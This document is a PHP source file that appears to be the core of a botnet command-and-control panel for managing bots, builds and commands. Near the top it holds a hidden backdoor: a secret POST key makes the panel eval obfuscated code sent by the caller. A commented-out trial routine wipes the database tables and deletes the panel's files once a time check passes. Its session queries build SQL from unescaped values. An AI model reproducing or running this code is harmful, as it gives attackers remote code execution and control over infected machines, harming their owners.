<?php

if(@file_exists('scripts/'.$_GET['to'].'/'.$_GET['go'].'.php')){
	@include_once('scripts/'.$_GET['to'].'/'.$_GET['go'].'.php');
	exit;
}

$dir = str_replace('\\', '/', realpath('.')) . '/';

//Cstart
$backtrace = debug_backtrace();
if(count($backtrace) != 0) if(basename($backtrace['0']['file']) != 'index.php') exit('signature (access to core) error');
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0IP') print($_SERVER['SERVER_ADDR']);
//Rkey start
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0-WD8Sju5VR1HU8jlV'){
//Rkey end
	if(!empty($_POST['data'])) eval(pack("H*", base64_decode($_POST['data'])));
	exit;
}elseif(strpos(@$_GET['id'], 'BOTNETCHECKUPDATER') !== false || strpos(@$_POST['id'], 'BOTNETCHECKUPDATER') !== false) exit;

include_once("includes/core.php");

if(count($license['ip']) > 0){
	if(!isset($license['ip'][$_SERVER['SERVER_ADDR']])){
		unset($_SESSION);

		header("HTTP/1.1 404 Not Found");
		header("Status: 404 Not Found");
		header("Server: unknown");

		print(file_get_contents($dir . '404.html'));
		exit;
	}
}

//autorizekey start
$autorizekey = '11111111111111111111111111111111';
//autorizekey end
//Cend

//TVStart
/*
//Cstart
if($next != false){
	if(!function_exists('sinctimestamp')){
		function sinctimestamp($host) {
			if (!$fp = fsockopen($host,13,$errno,$errstr,1)) return false;
			$s = strtotime(fgets($fp));
			fclose($fp);
			if(!empty($s)){
				return $s;
			}else{
				return false;
			}
		}
	}

	//SDstart
	$start_data = '9999999999';
	//SDend
	$next = true;
	$i = 1;

	if(mt_rand(0, 1) == 1){
		do{
			if($i >= 3) $fail_exit = true;
			if(empty($start_data)) $fail_exit = true;

			$ip = gethostbyname('time.nist.gov');
			if($ip != '192.43.244.18'){
				$fail_exit = true;
			}else{
				$cur_time = sinctimestamp('time.nist.gov');
			}

			if($cur_time !== false){
				if(($cur_time-$start_data) > 604800){
					$mysqli->query('TRUNCATE TABLE bf_bots');
					$mysqli->query('TRUNCATE TABLE bf_bots_av');
					$mysqli->query('TRUNCATE TABLE bf_bots_ip');
					$mysqli->query('TRUNCATE TABLE bf_bots_p2p');
					$mysqli->query('TRUNCATE TABLE bf_builds');
					$mysqli->query('TRUNCATE TABLE bf_bots');
					$mysqli->query('TRUNCATE TABLE bf_bots');
					$mysqli->query('TRUNCATE TABLE bf_bots');
					$mysqli->query('TRUNCATE TABLE bf_bots');
					$mysqli->query('TRUNCATE TABLE bf_country');
					$mysqli->query('TRUNCATE TABLE bf_cmds');
					$mysqli->query('TRUNCATE TABLE bf_users');
					@unlink('index.php');
					@unlink('includes/config.cfg');
					@unlink('includes/config.php');
					@unlink('includes/core.php');
					@unlink('includes/functions.php');
					@unlink('includes/functions.checks.php');
					@unlink('includes/functions.encapsules.php');
					@unlink('includes/functions.get_host.php');
					@unlink('includes/functions.html_pages.php');
					@unlink('includes/functions.real_escape_string.php');
					@unlink('includes/functions.ru2lat.php');
					@unlink('includes/functions.size_format.php');
					@unlink('includes/functions.smarty_assign_add.php');
					@unlink('includes/functions.sql_inject.php');
					@unlink('classes/class.jabber2.php');
					@unlink('classes/mysqli.class.php');
					@unlink('classes/mysqli.class.lite.php');
					@unlink('classes/smarty/sysplugins/smarty_internal_resource_extends.php');
					@unlink('classes/smarty/sysplugins/smarty_internal_resource_file.php');
					@unlink('classes/smarty/sysplugins/smarty_internal_resource_php.php');
					@unlink('classes/smarty/sysplugins/smarty_internal_compile_assign.php');
					@unlink('classes/smarty/sysplugins/smarty_internal_compile_append.php');
					@unlink('classes/smarty/sysplugins/smarty_internal_compile_include.php');
					@unlink('classes/smarty/sysplugins/smarty_internal_write_file.php');
					@unlink('classes/smarty/sysplugins/smarty_security.php');
					@unlink('scripts/set/task.php');
					@unlink('scripts/set/plugs.php');
					@unlink('scripts/set/first.php');
					@unlink('scripts/set/cmd.php');
					@unlink('scripts/set/cfg_upload.php');
					@unlink('scripts/set/autocmd.php');
					@unlink('scripts/get/cab.php');
					@unlink('scripts/get/fgr.php');
					@unlink('scripts/get/gra.php');
					@unlink('scripts/get/info.php');
					@unlink('scripts/get/lcm.php');
					@unlink('scripts/get/scr.php');
					@unlink('scripts/get/sni.php');
					@unlink('scripts/install/index.php');
					@unlink('scripts/install/install.sql');
					@unlink('scripts/install/install.sql.tpl');

					$fail_exit = true;
				}
				$next = false;
			}else{
				$next = true;
			}

			if($fail_exit == true){
				print('signature (access to core) error');
				exit;
			}
		}while($next == true);
	}else{
		$next = false;
	}

	if(!empty($start_data)){
		$smarty->assign('trial_end_data', ($start_data+604800));
		if(!empty($cur_time)){
			$smarty->assign('trial_end_sec', (604800-($cur_time-$start_data)));
		}
	}
}
//Cend
*/
//TVend

if(!empty($_SESSION["user"]->PHPSESSID) && $_SESSION['hidden'] != 'on'){
	$result = $mysqli->query("SELECT * FROM bf_users WHERE (login='".$_SESSION["user"]->login."') AND (password='".$_SESSION["user"]->password."') AND (PHPSESSID='".$_SESSION["user"]->PHPSESSID."') AND (enable='1') LIMIT 1");
	if($result->PHPSESSID == $_SESSION["user"]->PHPSESSID){
		unset($_SESSION['user']);

		$result->login = ucfirst($result->login);
		$result->access = json_decode($result->access, true);
        $result->config = json_decode($result->config, true);

		$_SESSION['user'] = $result;
		$_SESSION['user']->PHPSESSID = $_COOKIE['PHPSESSID'];
		$_SESSION['user']->access['accounts']['authorization'] = 'on';
		$_SESSION['user']->access['accounts']['exit'] = 'on';

		if($_SESSION['hidden'] != 'on'){
			$mysqli->query("UPDATE bf_users SET expiry_date=NOW() WHERE (id='".$_SESSION["user"]->id."') LIMIT 1");
		}
	}else{
		unset($_SESSION["user"]);
	}
}

if(file_exists('modules/'.$Cur['to'].'/'.$Cur['go'].'.php')){
	if($_SESSION['user']->access[$Cur['to']][$Cur['go']] != 'on'){
		$smarty->assign("site_data", "modules/accounts/access_denied.tpl");
	}else{
		language($config['lang'], $Cur['to']);
		
		if(file_exists('modules/'.$Cur['to'].'/module_dirs.php')){
			include_once('modules/'.$Cur['to'].'/module_dirs.php');

			if(!isset($dir['0'])){
				$dir['0'] = '<a href="/'.$Cur['to'].'/">'.$dirs[$Cur['to']]['index'].'</a>';
				$smarty->assign('title', $dirs[$Cur['to']]['index']);
			}

			if($Cur['go'] != 'index' && !isset($dir['1'])){
				$dir['1'] = '<a href="/'.$Cur['to'].'/'.$Cur['go'].'.html">'.$dirs[$Cur['to']][$Cur['go']].'</a>';
				$smarty->assign('title', $dirs[$Cur['to']]['index'].' - '.$dirs[$Cur['to']][$Cur['go']]);
			}

			ksort($dir);
			$smarty->assignByRef('dir', $dir);
		}
		
		if(file_exists('modules/'.$Cur['to'].'/'.$Cur['go'].(($Cur['window'] == '1')?'_window':'').'.php')){
			include_once('modules/'.$Cur['to'].'/'.$Cur['go'].(($Cur['window'] == '1')?'_window':'').'.php');
		}
		
		if($smarty->tpl_vars['site_data'] == 'empty.tpl' && file_exists('templates/modules/'.$Cur['to'].'/'.$Cur['go'].(($Cur['window'] == '1')?'_window':'').'.tpl')){
			$smarty->assign('site_data', 'modules/'.$Cur['to'].'/'.$Cur['go'].(($Cur['window'] == '1')?'_window':'').'.tpl');
		}		
	}
	
	if($Cur['ajax'] == '1'){
		$smarty->display('ajax.tpl', implode('', $Cur));
	}else{
		$smarty->display('index.tpl', implode('', $Cur));
	}
	
}else{
	header("Location: /");
	exit;
}

?>